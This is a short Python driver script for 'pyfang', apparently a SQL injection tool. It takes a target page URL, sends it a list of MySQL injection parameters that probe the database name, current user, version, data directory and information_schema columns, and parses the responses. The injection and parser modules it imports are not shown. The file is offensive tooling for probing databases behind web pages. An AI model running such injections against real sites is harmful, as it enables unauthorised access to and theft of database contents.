#!/usr/bin/python
"""
    Driver program for pyfang. Handles user-defined options and calls appropriate modules.

    OPTIONS to support:
        -f: \n-delimited text file of parameters to inject (default is mysql_params).
        -d: Database to try injections against (default is MySQL).
        -v: Verbose mode.

"""
import os, sys, urllib2
import pf_injection, pf_parser
import json

if __name__ == '__main__':

    page = sys.argv[1]

    # Dicts of useful params for various DBs. 
    # Turn into text files so user can use their own.
    mysql_params = ['database()', 'user()', '@@version', '@@datadir', 'from information_schema.columns']

    injector = pf_injection.injection("")
    data = injector.injection(page, mysql_params)

    pf_parser.parse(data) 


